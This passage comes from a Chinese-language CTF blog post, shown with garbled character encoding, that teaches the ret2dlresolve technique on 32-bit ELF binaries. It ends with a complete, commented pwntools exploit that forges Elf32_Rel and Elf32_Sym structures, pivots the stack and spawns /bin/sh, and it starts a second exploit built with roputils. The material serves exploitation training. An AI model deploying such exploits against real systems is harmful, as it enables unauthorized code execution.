title="ç„¶åè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ€ä¹ˆåœ¨.dynsymä¸­æ‰¾åˆ°æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªå‡½æ•°çš„ç»“æ„ï¼Ÿ"></a>ç„¶åè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ€ä¹ˆåœ¨.dynsymä¸­æ‰¾åˆ°æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªå‡½æ•°çš„ç»“æ„ï¼Ÿ</h4><p><strong>æ‰¾åˆ°è¿™ä¸ªç»“æ„å…¶å®ä¹Ÿåªæ˜¯éœ€è¦æ‹¿åˆ°å®ƒè·ç¦».dynsymé¦–åœ°å€çš„åç§»å³å¯ï¼Œè€Œè¿™ä¸ªåç§»éœ€è¦å»æ‰¾åˆ°rel.pltè¡¨</strong>ï¼Œè¿™ä¸ªè¡¨æ˜¯ç”±Elf32_Relç»“æ„ä½“ç»„æˆï¼Œè€Œ<strong>å°†å®ƒçš„ç¬¬äºŒä¸ªæˆå‘˜å­˜å‚¨çš„å†…å®¹ç®—æœ¯å³ç§»å…«ä½ï¼Œå¾—åˆ°çš„æ•°å€¼å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ç»“æ„è·ç¦».dynsymçš„åç§»</strong><br>ç°åœ¨çš„é—®é¢˜åˆæ˜¯è¦å»æ‰¾rel.pltè¡¨ï¼Œä¸è¿‡å¥½åœ¨<strong>rel.pltä¹Ÿä½äº.dynamicæ®µ</strong>ï¼Œ**<font color=red>ç”±äºæ¯ä¸ªElf32_Relçš„ç»“æ„ä½“åˆéƒ½å¯¹åº”ä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤æ€ä¹ˆå»æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„é‚£ä¸ªElf32_Relå‘¢ï¼Ÿ</font>**<br>åˆè¦ç”¨åˆ°åç§»ï¼Œè€Œè¿™ä¸ªåç§»æˆ‘ä»¬ä¸éœ€è¦æ‰¾äº†ï¼Œå› ä¸º<strong>è¿™ä¸ªåç§»å°±æ˜¯_dl_runtime_resolveçš„ç¬¬äºŒä¸ªå‚æ•°reloc_index</strong>ï¼Œå¦‚æ­¤æ¨å›å»ï¼Œä¹Ÿå°±çŸ¥é“äº†æˆ‘ä»¬éœ€è¦çš„.dynstré¦–åœ°å€çš„åç§»äº†ã€‚</p><h2 id="dl-runtime-resolveå‡½æ•°è¿ä½œçš„æµç¨‹å›¾"><a href="#dl-runtime-resolveå‡½æ•°è¿ä½œçš„æµç¨‹å›¾" class="headerlink" title="_dl_runtime_resolveå‡½æ•°è¿ä½œçš„æµç¨‹å›¾"></a>_dl_runtime_resolveå‡½æ•°è¿ä½œçš„æµç¨‹å›¾</h2><p>æŠŠä¸Šé¢çš„å€’æ¨è¿‡ç¨‹ç”»æˆå›¾å°±æ˜¯è¿™ä¸ªæ ·å­ã€‚<br><img src="/../img/2706180-20220228094846054-1801078117.png"></p><h1 id="æ¼æ´æ‰€åœ¨"><a href="#æ¼æ´æ‰€åœ¨" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h1><p>é€šè¿‡é˜…è¯»ä¸Šé¢çš„æ‰€æœ‰å†…å®¹ï¼Œå…¶å®æ˜¯å¯ä»¥å‘ç°ï¼Œæœ€å<strong>_dl_lookup_symbol_x</strong>å‡½æ•°ä¼šå»æœç´¢å­—ç¬¦ä¸²æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°<strong>å¹¶ä¸åœ¨ä¹ä½ ç»™çš„å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä½ æ­¤åˆ»åœ¨å»¶è¿Ÿç»‘å®šçš„å‡½æ•°</strong>ï¼Œå³ä½¿è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯åˆ«çš„å‡½æ•°çš„åç§°ï¼Œå®ƒä¾æ—§ä¼šå»æœç´¢ï¼Œ<strong>å¹¶ä¸”åŠ¨æ€è£…è½½å™¨å¹¶ä¸ä¼šå»æ£€æŸ¥é‡å®šä½è¡¨çš„è¾¹ç•Œï¼Œå³ä½¿ä½ çš„_dl_runtime_resolveå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯æå¤§çš„ï¼Œæ­¤æ—¶çš„åç§»å·²ç»è¶…è¿‡äº†rel,pltæ®µçš„èŒƒå›´</strong>ï¼Œè£…è½½å™¨ä¹Ÿä¾æ—§æ˜¯è®¤ä¸ºè¿™åªæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„rel.pltåç§»ï¼Œå®ƒä¸è®¤ä¸ºè¿™ä¸ªåç§»è¶…è¿‡äº†rel.pltæ®µï¼Œæœ€é‡è¦çš„å°±æ˜¯<strong>32ä½ç¨‹åºé‡Œé¢ï¼Œæ˜¯ç”¨çš„æ ˆä¼ å‚ï¼Œå› æ­¤è¿™å°±æ„å‘³ç€_dl_runtime_resolveçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯ä»¥è¢«ä¼ªé€ çš„</strong>ï¼Œç»¼ä¸Šæ‰€è¿°ï¼Œ<font color=red>æˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªå¾ˆå¤§çš„ reloc_index,è®©åŸæœ¬åç§»åˆ°rel.pltæ®µçš„reloc_indexåç§»åˆ°æˆ‘ä»¬ä¼ªé€ çš„å¯æ§å†…å­˜ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ç³»åˆ—çš„ç»“æ„ï¼Œæœ€ç»ˆè®©è·ç¦»dynstræ®µé¦–çš„åç§»æŒ‡å‘æˆ‘ä»¬æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ä¼ªé€ äº†å­—ç¬¦ä¸²ï¼‰ï¼Œè‡³æ­¤_dl_lookup_symbolå‡½æ•°å°±å»æœç´¢åˆ°äº†æˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°ã€‚</font></p><h1 id="å®æˆ˜ret2dlresolve"><a href="#å®æˆ˜ret2dlresolve" class="headerlink" title="å®æˆ˜ret2dlresolve"></a>å®æˆ˜ret2dlresolve</h1><h2 id="æ‰‹åŠ¨æ„é€ expæ¢ç©¶åŸç†"><a href="#æ‰‹åŠ¨æ„é€ expæ¢ç©¶åŸç†" class="headerlink" title="æ‰‹åŠ¨æ„é€ expæ¢ç©¶åŸç†"></a>æ‰‹åŠ¨æ„é€ expæ¢ç©¶åŸç†</h2><p>æˆ‘æ„Ÿè§‰ret2dlresolveçš„æƒ…å†µåªé€‚ç”¨äºæ²¡æœ‰æ‰“å°å‡½æ•°çš„ç¨‹åºï¼Œæ¯•ç«Ÿæœ‰äº†æ‰“å°å‡½æ•°å°±å¯ä»¥ç›´æ¥ç”¨ret2libcäº†ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¥åªæœ‰ä¸€ä¸ªreadå‡½æ•°çš„é¢˜ç›®æ¥æ¼”ç¤ºä¸€ä¸‹</p><p><img src="/../img/2706180-20220228094854685-707283332.png"></p><p><img src="/../img/2706180-20220228094901516-535707583.png"></p><p>å‘ç°åªæœ‰ä¸€ä¸ªreadå‡½æ•°ï¼Œç„¶åå­˜åœ¨æº¢å‡ºï¼Œç„¶åå°±å•¥éƒ½æ²¡æœ‰äº†ï¼Œæ²¡æœ‰systemå‡½æ•°ï¼Œæ²¡æœ‰å‚æ•°ã€‚åƒè¿™ç§æƒ…å†µå°±è€ƒè™‘ret2dlresolveçš„æ–¹æ³•äº†ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ç›´æ¥å°±ä¸Šexpäº†ï¼Œè¯¦ç»†è§£é‡Šéƒ½åœ¨expé‡Œé¢ã€‚ï¼ˆé‡Œé¢æœ‰çš„è¦ç”¨åˆ°å›¾ç‰‡è§£é‡Šçš„åœ°æ–¹ï¼Œæˆ‘æœ‰è¿›è¡Œæ ‡æ³¨ï¼Œè¯·å‚è€ƒæœ€ä¸‹é¢çš„è¡¥å……å†…å®¹ï¼‰<br>é¢˜ç›®æˆ‘ä¸Šä¼ åˆ°ç½‘ç›˜ä¸Šäº† é“¾æ¥<a href="https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa">https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa</a>  æå–ç ykpa</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#å…ˆåˆå§‹åŒ–ä¸€ä¸‹ä¸€ä¼šè¦ç”¨åˆ°çš„æ®µé¦–åœ°å€ï¼Œå°±æ˜¯æŠŠæ¯ä¸ªæ®µçš„é¦–åœ°å€éƒ½ç»™èµ‹å€¼ç»™å˜é‡</span></span><br><span class="line"><span class="comment">#å½“ç„¶äº†ï¼Œä½ è¦æ˜¯æƒ³å»idaé‡Œé¢ä¸€ä¸ªä¸€ä¸ªæ‰‹åŠ¨æ‰¾å‡ºæ¥ï¼Œä¹Ÿå®Œå…¨æ²¡é—®é¢˜</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">44</span><span class="comment">#è¿™ä¸ªåç§»æ²¡å•¥å¥½è¯´çš„äº†ï¼Œidaæˆ–è€…gdbéƒ½èƒ½å¾—åˆ°</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x080485d8</span><span class="comment">#è¿™é‡Œé‡‡ç”¨çš„æ˜¯è¿ç»­popå››æ¬¡çš„gadgetåœ°å€</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804854A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"><span class="comment">#è¿™ä¸ªbase_addræ˜¯æˆ‘ä»¬è¦æŠŠæ ˆè¿ç§»çš„åœ°æ–¹ï¼Œç”¨gdbå‘ç°è¿™ä¸€éƒ¨åˆ†æ˜¯å¯å†™çš„</span></span><br><span class="line"><span class="comment">#å› æ­¤æˆ‘ä»¬é€‰æ‹©è¿ç§»åˆ°è¿™é‡Œï¼ˆå…·ä½“å‚è€ƒè¡¥å……â‘ ï¼‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#è¿™ä¸ªfake_sym_addræ˜¯Elf32_Symç»“æ„çš„é¦–åœ°å€</span></span><br><span class="line"><span class="comment">#åŸæœ¬æ˜¯è¦æŠŠä¼ªé€ çš„ELf32_Symç»“æ„å†™åœ¨åç§»32çš„ä½ç½®çš„ï¼Œä½†æ˜¯è¿˜è¦å¯¹é½ï¼Œå› æ­¤ä¸‹é¢è¿˜è¦å†åŠ align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Symç»“æ„æ˜¯16å­—èŠ‚ï¼Œå› æ­¤åœ°å€ä¹Ÿéœ€è¦å’Œ16å­—èŠ‚å¯¹é½ï¼ŒäºŒè€…åœ°å€ç›¸å‡</span></span><br><span class="line"><span class="comment">#ç„¶ååªå–æœ€åä¸€ä½ï¼Œå°±å¯ä»¥ç†è§£æˆäºŒè€…çš„åœ°å€æ˜¯æ”¾åœ¨äº†ä¸€ä¸ªç»“æ„é‡Œé¢</span></span><br><span class="line"><span class="comment">#ï¼ˆå› ä¸ºåªè€ƒè™‘æœ€åä¸€ä½çš„è¯èŒƒå›´åªæ˜¯åœ¨16å­—èŠ‚ä»¥å†…ï¼ˆä½†å…¶å®ä¸æ˜¯è¿™æ ·çš„ï¼Œä¸è¿‡å¯ä»¥ç†è§£æˆè¿™æ ·ï¼Œç”»ä¸ªå›¾å°±æ‡‚äº†ï¼‰</span></span><br><span class="line"><span class="comment">#ç„¶åæœ€åçš„å€¼è¢«0x10æ‰€å‡ï¼Œæ±‚çš„å°±æ˜¯fake_sym_addrè·ç¦»16ä¸ªå­—èŠ‚æ‰€è¡¥é½å·®çš„å­—èŠ‚æ•°</span></span><br><span class="line"><span class="comment">#è‡³äºä¸ºä»€ä¹ˆå‡çš„æ˜¯dynsymï¼Œæ·¦ï¼Œå› ä¸ºdynsymä¸€å®šæ˜¯è¢«å¯¹é½äº†çš„ï¼Œå› æ­¤å®ƒéœ€è¦æ‰¾ä¸€ä¸ªå¯¹é½çš„è¡¨æ¥åšå‚è€ƒå•Š</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#æœ€åå†åŠ ä¸Šè¿™ä¸ªä¸ºäº†è¡¥é½çš„å­—èŠ‚æ‰æ˜¯æœ€åæˆ‘ä»¬è¦æ„é€ çš„fake_symçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#è¿™ä¸ªst_nameå°±æ˜¯dynstræ®µé¦–åœ°å€è·ç¦»ç›®æ ‡å‡½æ•°åç§°çš„åç§»</span></span><br><span class="line"><span class="comment">#æˆ‘ä»¬æŠŠæœ€ç»ˆçš„systemå‡½æ•°åç§°å¸ƒç½®åˆ°äº†fake_sym_addr+0x10çš„ä½ç½®ï¼Œä¸ºå•¥åŠ 0x10?</span></span><br><span class="line"><span class="comment">#å› ä¸ºsystemä¸Šé¢è¿˜æœ‰ä¸€ä¸ªElf32_Symçš„ç»“æ„ï¼Œè¿™ä¸ªç»“æ„å¤§å°ä¸º16å­—èŠ‚</span></span><br><span class="line">st_info=<span class="number">12</span><span class="comment">#è¿™ä¸ªå…¶å®æ˜¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯å‰24å­—èŠ‚çš„st_bindå’Œåå…«å­—èŠ‚çš„st_typeï¼ˆä¸è¿‡æˆ‘æ„Ÿè§‰æ²¡å¿…è¦åŒºåˆ†ï¼Œç›´æ¥åŠ èµ·æ¥å°±è¡Œï¼‰</span></span><br><span class="line"><span class="comment">#å¦å¤–å°±æ˜¯è¿™ä¸ª12æ˜¯å¯ä»¥åœ¨IDAé‡Œé¢é€šè¿‡dynsymæ¥æŸ¥åˆ°ï¼ˆå…·ä½“å‚è€ƒè¡¥å……â‘¡ï¼‰</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)<span class="comment">#è¿™ä¸ªå°±æ˜¯ä¼ªé€ çš„Elf32_Symç»“æ„</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#è¿™ä¸ªæ˜¯ret.pltç»“æ„ä¸­çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œä¹Ÿå°±æ˜¯è§£æä¹‹åçš„çœŸå®åœ°å€å†™å…¥çš„åœ°æ–¹</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#è¿™ä¸ªæˆ‘ä¸æ˜¯å¤ªç¡®å®šï¼Œæˆ‘æ„Ÿè§‰é™¤0x10æ˜¯å› ä¸ºElf32_Symçš„å¤§å°æ˜¯16å­—èŠ‚</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªåç§»åº”è¯¥æ˜¯ä»¥ä¸€ä¸ªç»“æ„ï¼ˆ16å­—èŠ‚ï¼‰ä¸ºå•ä½çš„</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#è¿™ä¸ª0x7æ˜¯é‡å®šä½çš„ä¸€ç§ç±»å‹ï¼ŒæŒ‡çš„æ˜¯å¯¼å…¥å‡½æ•°ï¼Œè¿›å…¥_dl_fixupå‡½æ•°é‡Œé¢ï¼Œè¿˜ä¼šæ£€æŸ¥è¿™æ˜¯ä¸æ˜¯0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#è¿™é‡Œ&lt;&lt;8æ˜¯å› ä¸ºï¼Œæœ€åè¿˜è¦å†&gt;&gt;8ï¼Œä»è€Œä¿æŒæ­£å¸¸ï¼Œè€Œ&amp;0xfï¼Œå…¶å®æ²¡ç”¨ï¼Œä¸å†™ä¹Ÿè¡Œ</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#ä»rel.pltåˆ°base_addr+24çš„åç§»ä¹Ÿå°±æ˜¯æ‰§è¡Œ_dl_runtime_resolveçš„ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment">#è€ŒåŠ 24çš„åŸå› æ˜¯ï¼Œæˆ‘ä»¬å°†rel.pltç»“æ„å¸ƒç½®åœ¨äº†è·ç¦»base_addråç§»24çš„ä½ç½®</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#è¿™é‡Œå°±æ˜¯ä¼ªé€ çš„rel.pltç»“æ„</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#åŠ«æŒæ‰§è¡Œæµï¼Œè®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡readï¼Œå°†æˆ‘ä»¬æƒ³è¦ä¼ªé€ çš„å†…å®¹å­˜å…¥æˆ‘ä»¬æŒ‡å®šçš„åœ°æ–¹</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#è¿™é‡Œéœ€è¦ç”¨è¿ç»­å››ä¸ªpopæŠŠæ ˆé¡¶çš„å†…å®¹ç»™ä»æ ˆé¡¶æ¸…ç©ºï¼Œä¸ç„¶retçš„æ—¶å€™å°±ä¼šå‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="comment">#è¿™é‡Œé‡‡ç”¨å››ä¸ªpopçš„åŸå› æ˜¯å› ä¸ºå¦‚æœé‡‡ç”¨ä¸‰ä¸ªpopçš„è¯ï¼Œç¬¬ä¸‰ä¸ªpopæ˜¯å¼¹ç»™äº†ebpï¼Œè¿™æ ·è¿ç§»çš„è¯å°±ä¼šå‡ºç°é—®é¢˜ï¼Œ</span></span><br><span class="line"><span class="comment">#å› æ­¤æˆ‘ç”¨äº†å››ä¸ªpopå‰ä¸‰ä¸ªæ¸…ç©ºæ ˆé¡¶çš„å‚æ•°ï¼Œåä¸€ä¸ªpopå»æ”¹å˜ebpçš„å€¼ï¼Œä¸ºäº†æ­£å¸¸çš„å®Œæˆæ ˆè¿ç§»</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span><span class="comment">#è¿™é‡Œå¦‚æœç”¨base_addrçš„æ—¶å€™ï¼Œä¼šå‡ºç°é—®é¢˜ï¼Œè°ƒè¯•çš„æ—¶å€™å‘ç°dl_fixupçš„æ—¶å€™å‘ç°</span></span><br><span class="line"><span class="comment">#é‡Œé¢pushäº†ä¸€ä¸ªecxï¼Œï¼ˆè¿™ä¸ªecxï¼‰è¢«ç”¨æ¥å½“åšdl_fixupçš„å‚æ•°ï¼ˆlink_map)ï¼Œè¿™ä¸ªecxå°±æ˜¯æˆ‘ä»¬ç¬¬äºŒæ¬¡è¾“å…¥çš„é¦–åœ°å€</span></span><br><span class="line"><span class="comment">#å¦‚æœé¦–åœ°å€é‡Œé¢è£…äº†4ä¸ªaçš„è¯ï¼Œå°±ä¼šå‡ºç°é”™è¯¯ï¼ˆå› ä¸ºå‚æ•°link_mapæ€ä¹ˆèƒ½æ˜¯4ä¸ªaå‘¢ï¼‰ï¼Œé€šè¿‡è°ƒè¯•å‘ç°ï¼Œlink_mapæœ¬èº«æ­£å¸¸çš„</span></span><br><span class="line"><span class="comment">#å‚æ•°å°±æ˜¯pushäº†ds:0x0804a004(æ­¤æ—¶çš„æ ˆå·²ç»è¿ç§»è¿‡äº†ï¼Œè°ƒè¯•å‘ç°å‹åˆ°çš„è¿™ä¸ªæ ˆé¡¶å±…ç„¶å°±æ˜¯0x0804a800ï¼‰ï¼Œå› æ­¤ä¸ºäº†è®©dl_fixupæ‹¿åˆ°</span></span><br><span class="line"><span class="comment">#è¿™ä¸ªæ­£å¸¸çš„å‚æ•°ï¼Œæˆ‘ä»¬å°±è¦è®©ecxæ˜¯0x0804a800ï¼Œè€Œæ€ä¹ˆè®©è¿™ä¸ªecxå˜æˆ0x0804a800ï¼Œæˆ‘ä»¬åªèƒ½æ˜¯readè¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment">#è®¾ç½®æˆ0x0804a800æ‰å¯ä»¥ï¼Œè€Œæˆ‘ä»¬è¿ç§»ä¹‹åè¿˜æƒ³è®©0x0804a800è¿™é‡Œçš„æ•°æ®æ˜¯æ­£å¸¸çš„ï¼Œé‚£å°±åªèƒ½è¿ç§»åˆ°çš„åœ°å€è°ƒé«˜0x4ä¸ªå­—èŠ‚ï¼Œè¿™æ ·</span></span><br><span class="line"><span class="comment">#è¿ç§»è¿‡æ¥çš„æ—¶å€™ï¼Œæ ˆé¡¶ï¼ˆä¹Ÿå°±æ˜¯0x0804a800ï¼‰ä¾ç„¶æ˜¯æ­£å¸¸çš„link_map</span></span><br><span class="line"><span class="comment">#ï¼ˆå¦‚æœä¸å¤ªç†è§£æˆ‘è¯´çš„æ˜¯ä»€ä¹ˆæ„æ€çš„è¯ï¼Œè‡ªå·±å¯ä»¥æŠŠbase_addr-4æ”¹æˆbase_addrç”¨gdbè°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼‰</span></span><br><span class="line">payload1+=p32(leave_ret_addr)<span class="comment">#å¦‚æœä¸çŸ¥é“è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨leave_ret_addrçš„è¯</span></span><br><span class="line"><span class="comment">#å»ºè®®å†å­¦ä¹ ä¸€ä¸‹æ ˆè¿ç§»ï¼Œæˆ‘çš„åšå®¢ä¸Šæœ‰ä¸€ç¯‡è¯¦ç»†ä»‹ç»äº†æ ˆè¿ç§»çš„æ–‡ç« </span></span><br><span class="line">p.send(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#payload2=&#x27;aaaa&#x27;#ä¸Šé¢é‡‡ç”¨äº†æŠ¬é«˜0x4å­—èŠ‚ï¼Œå› æ­¤è¿™é‡Œä¸ç”¨å†å¡«å……åƒåœ¾æ•°æ®äº†ï¼Œä»¥ä¾¿è®©dl_fixupæ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line">payload2=p32(plt0)<span class="comment">#è¿™ä¸ªplt0å’Œä¸‹é¢çš„reloc_indexï¼Œä»–ä»¬å…±åŒç»„æˆäº†read_pltï¼ˆå…·ä½“å‚è€ƒä¸‹é¢çš„è¡¥å……â‘¢ï¼‰</span></span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#è¿™å››ä¸ªbå°±æ˜¯è¿”å›åœ°å€</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#è¿™ä¸ªæ”¾ç½®çš„æ˜¯systemçš„å‚æ•°çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯/bin/shçš„ä½ç½®</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#ç”±äºreadçš„å‚æ•°æ˜¯ä¸‰ä¸ªï¼Œè€Œsystemçš„å‚æ•°åªç”¨äº†ç¬¬ä¸€ä¸ªï¼Œå› æ­¤å¦å¤–ä¸¤ä¸ªå‚æ•°éœ€è¦å¡«å……ä¸€ä¸‹åƒåœ¾æ•°æ®</span></span><br><span class="line">payload2+=fake_rel_plt<span class="comment">#å¼€å§‹æ”¾ç½®ä¼ªé€ çš„rel.pltè¡¨</span></span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span><span class="comment">#ä¿è¯fake_symæ˜¯å¯¹é½äº†16å­—èŠ‚</span></span><br><span class="line">payload2+=fake_sym<span class="comment">#ä¼ªé€ çš„Elf32_Symç»“æ„</span></span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span><span class="comment">#æœ€ç»ˆä¼ªé€ çš„å­—ç¬¦ä¸²ï¼Œè®©dl_lookup_symbol_xå»æœç´¢è¿™ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#å› ä¸ºä¸Šé¢æåˆ°äº†ä¼šæŠŠå‚æ•°æ”¾åœ¨åç§»80çš„ä½ç½®ï¼Œå› æ­¤è¿™é‡Œå¡«å……\x00åˆ°åç§»80è¿™é‡Œ</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¡¥å……â‘ </p><p><img src="/../img/2706180-20220228094915257-286002672.png"></p><p>è¡¥å……â‘¡</p><p><img src="/../img/2706180-20220228094921502-932826454.png"></p><p>è¡¥å……â‘¢</p><p><img src="/../img/2706180-20220228094929697-1836063513.png"></p><p>payload2&#x3D;p32(plt0)<br>payload2+&#x3D;p32(reloc_index)</p><p>è¿™ä¸¤æ­¥å¯¹åº”çš„å°±æ˜¯å›¾ä¸­æ ‡æ³¨çš„ä¸¤æ­¥ï¼Œè¿™ä¹Ÿå°±æ˜¯pltåœ¨å¹²çš„äº‹æƒ…ï¼ˆå› æ­¤ä½ å¯ä»¥æŠŠè¿™ä¸¤æ­¥ç­‰åŒäºp32(read_plt_addr)ï¼‰</p><h2 id="å·¥å…·æ”»å‡»"><a href="#å·¥å…·æ”»å‡»" class="headerlink" title="å·¥å…·æ”»å‡»"></a>å·¥å…·æ”»å‡»</h2><p>å¦å¤–ä¹Ÿå¯ä»¥é‡‡ç”¨Roputilå·¥å…·ï¼Œè¿›è¡Œæ”»å‡»ï¼Œè¿™ä¸ªå·¥å…·çš„å¨åŠ›æ˜¯å¾ˆå¤§çš„ï¼Œæˆ‘ä»¬æ ¹æœ¬ä¸éœ€è¦æ”¹ä»€ä¹ˆä¸œè¥¿ï¼Œåªè¦æ¢ä¸ªåç§»å’Œç¨‹åºåï¼Œç„¶åå°±ä¸€æŠŠæ¢­äº†ã€‚å·¥å…·åœ¨æ­¤ä¸‹è½½<a href="https://github.com/inaz2/roputils">https://github.com/inaz2/roputils</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)<span class="comment">#è¿™ä¸ªropï¼Œå°±å¯ä»¥ç†è§£æˆelfï¼Œè¿™é‡Œå°±æ˜¯è·å–äº†bssæ®µé¦–åœ°å€</span></span><br><span class="line">buf = rop.fill(offset)<span class="comment">#å¡«å……åƒåœ¾æ•°æ®</span></span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)<span class="comment">#æ·»åŠ ä¸€ä¸ªè°ƒç”¨ï¼Œè°ƒç”¨äº†readå‡½æ•°ï¼Œåé¢æ˜¯å®ƒçš„å‚æ•°</span></span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)<span 